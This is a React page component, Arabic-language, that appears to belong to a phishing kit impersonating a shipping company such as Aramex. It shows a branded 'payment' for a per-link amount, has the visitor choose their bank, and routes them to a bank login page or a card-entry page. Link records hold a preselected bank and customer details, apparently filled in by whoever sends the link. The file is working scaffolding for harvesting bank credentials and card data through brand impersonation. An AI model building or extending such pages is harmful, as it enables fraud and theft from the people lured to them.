import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2, Lock, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { getPaymentAmount } from "@/utils/paymentData";
import type { ShippingInfo } from "@/types/payment";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  // Get country from link data
  const countryCode = linkData?.country_code || "";
  const countryData = getCountryByCode(countryCode);
  
  // Get preselected bank from link payload if available
  const preselectedBank = linkData?.payload?.selected_bank;
  
  // Get customer info from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as ShippingInfo | undefined;

  // Get amount dynamically from any service type
  const amount = getPaymentAmount(linkData?.payload);

  const formattedAmount = `${amount} ر.س`;
  
  // Load banks when country is available from link data
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      // Simulate API call
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        // Auto-select bank if it was preselected during link creation
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkip = async () => {
    if (!linkData) return;

    // Save to link for cross-device compatibility
    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      console.error('Error saving bank selection:', error);
    }

    toast({
      title: "تم التخطي",
      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
    });

    navigate(`/pay/${id}/card-input`);
  };

  const handleContinue = async () => {
    if (!linkData || !selectedBank) return;

    // Save to link for cross-device compatibility
    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: selectedBank,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      console.error('Error saving bank selection:', error);
    }

    // إعادة التوجيه إلى صفحة تسجيل الدخول المطابقة للبنك
    navigate(`/pay/${id}/bank-login-page`);
  };
  
  // Show loading state while fetching link data
  if (linkLoading || !linkData) {
    return (
      <>
        <Helmet>
          <html className="light-mode" />
          <body className="light-mode" />
        </Helmet>
        <div 
          className="min-h-screen light-mode py-4 sm:py-12 flex items-center justify-center" 
          dir="rtl"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
          }}
        >
          <div className="text-center">
            <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
            <p style={{ color: branding.colors.textLight }}>جاري تحميل البيانات...</p>
          </div>
        </div>
      </>
    );
  }
  
  // Show error if no country data
  if (!countryData) {
    return (
      <>
        <Helmet>
          <html className="light-mode" />
          <body className="light-mode" />
        </Helmet>
        <div className="min-h-screen light-mode flex items-center justify-center" dir="rtl">
          <div className="text-center p-8">
            <Building2 className="w-16 h-16 mx-auto mb-4" style={{ color: branding.colors.textLight }} />
            <h2 className="text-2xl font-bold mb-2" style={{ color: branding.colors.text }}>خطأ في البيانات</h2>
            <p style={{ color: branding.colors.textLight }} className="mb-6">لم يتم العثور على بيانات الدولة</p>
            <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
          </div>
        </div>
      </>
    );
  }
  
  return (
    <>
      <Helmet>
        <html className="light-mode" />
        <body className="light-mode" />
      </Helmet>
      <div 
        className="min-h-screen light-mode py-4 sm:py-12" 
        dir="rtl"
        style={{
          background: branding.colors.background || `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
        }}
      >
      <div className="container mx-auto px-4 max-w-2xl">
        {/* Hero Header */}
        <div
          className="relative w-full h-32 sm:h-48 rounded-3xl overflow-hidden mb-6 shadow-xl"
          style={{
            background: branding.gradients?.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          }}
        >
          <div className="absolute inset-0 bg-black/20" />
          {branding.heroImage && (
            <img 
              src={branding.heroImage} 
              alt={serviceName}
              className="absolute inset-0 w-full h-full object-cover opacity-30"
            />
          )}
          <div className="absolute inset-0 flex items-center justify-between px-6">
            <div className="text-white">
              <h1 className="text-2xl sm:text-4xl font-bold mb-2" style={{ fontFamily: branding.fonts?.primaryAr }}>
                {serviceName}
              </h1>
              <p className="text-sm sm:text-base opacity-90">اختر البنك - {formattedAmount}</p>
            </div>
            {branding.logo && (
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
        </div>
        
        {/* Header */}
        <div className="mb-6">
          <button
            onClick={() => navigate(`/pay/${id}/details`)}
            className="flex items-center gap-2 text-sm mb-4"
            style={{ color: branding.colors.primary }}
          >
            <ArrowLeft className="w-4 h-4" />
            <span>رجوع</span>
          </button>
        </div>

        {/* Country Badge */}
        {countryData && (
          <div className="mb-4">
            <Badge variant="secondary" className="text-sm">
              {countryData.flag} {countryData.nameAr}
            </Badge>
          </div>
        )}

        {/* Loading Banks */}
        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
            <p className="text-muted-foreground">جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center border-t-4" style={{ borderTopColor: branding.colors.primary }}>
            <Building2 className="w-12 h-12 mx-auto mb-4" style={{ color: branding.colors.textLight }} />
            <p className="mb-4" style={{ color: branding.colors.textLight }}>لا توجد بنوك متاحة لهذه الدولة</p>
            <Button onClick={handleSkip} variant="outline" style={{ borderColor: branding.colors.primary, color: branding.colors.primary }}>
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            {/* Banks Grid */}
            <Card className="p-6 mb-6 shadow-xl border-t-4" style={{ borderTopColor: branding.colors.primary, background: branding.colors.background }}>
              <h2 className="text-xl font-bold mb-4" style={{ color: branding.colors.primary, fontFamily: branding.fonts?.primaryAr }}>
                البنوك المتاحة
              </h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {banks.map((bank) => (
                <Card
                  key={bank.id}
                  className={`p-5 cursor-pointer transition-all hover:shadow-lg hover:scale-105 ${
                    selectedBank === bank.id
                      ? 'ring-2 shadow-xl scale-105'
                      : ''
                  }`}
                  style={{
                    borderColor: selectedBank === bank.id ? bank.color : '#e5e7eb',
                    borderWidth: selectedBank === bank.id ? '2px' : '1px',
                    background: selectedBank === bank.id ? `${bank.color}08` : '#ffffff',
                  }}
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div className="flex items-center gap-3">
                    {bank.logo ? (
                      <div
                        className="w-12 h-12 rounded-lg flex items-center justify-center bg-white p-2 shadow-sm"
                        style={{
                          border: selectedBank === bank.id 
                            ? `2px solid ${bank.color}` 
                            : '2px solid #e5e7eb',
                        }}
                      >
                        <img 
                          src={bank.logo} 
                          alt={bank.nameAr}
                          className="w-full h-full object-contain"
                          onError={(e) => {
                            e.currentTarget.style.display = 'none';
                            e.currentTarget.parentElement!.innerHTML = `<span class="text-sm font-bold" style="color: ${bank.color}">${bank.nameAr.charAt(0)}</span>`;
                          }}
                        />
                      </div>
                    ) : (
                      <div
                        className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                        style={{
                          background: selectedBank === bank.id
                            ? `linear-gradient(135deg, ${bank.color}, ${bank.secondaryColor || bank.color})`
                            : '#64748b',
                        }}
                      >
                        {bank.nameAr.charAt(0)}
                      </div>
                    )}
                    <div className="flex-1">
                      <h3 className="font-semibold text-sm">{bank.nameAr}</h3>
                      <p className="text-xs text-muted-foreground">{bank.name}</p>
                    </div>
                    {selectedBank === bank.id && (
                      <div
                        className="w-5 h-5 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: branding.colors.primary }}
                      >
                        <svg
                          className="w-3 h-3 text-white"
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    )}
                  </div>
                </Card>
              ))}
            </div>
            </Card>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button
                onClick={handleContinue}
                disabled={!selectedBank}
                className="w-full h-14 text-base font-bold text-white shadow-lg"
                style={{
                  background: selectedBank
                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    : undefined,
                  fontFamily: branding.fonts?.primaryAr
                }}
              >
                <Lock className="w-5 h-5 ml-2" />
                تسجيل الدخول للبنك
              </Button>
              
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base font-semibold"
                style={{
                  borderColor: branding.colors.primary,
                  color: branding.colors.primary
                }}
              >
                <CreditCard className="w-5 h-5 ml-2" />
                إدخال بيانات البطاقة مباشرة
              </Button>
            </div>

            {/* Info Note */}
            <div className="mt-6 p-4 rounded-lg" style={{ background: `${branding.colors.secondary}15`, borderRadius: branding.borderRadius?.md }}>
              <p className="text-xs text-center" style={{ color: branding.colors.textLight, fontFamily: branding.fonts?.primaryAr }}>
                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
              </p>
            </div>
          </>
        )}
      </div>
    </div>
    </>
  );
};

export default PaymentBankSelector;
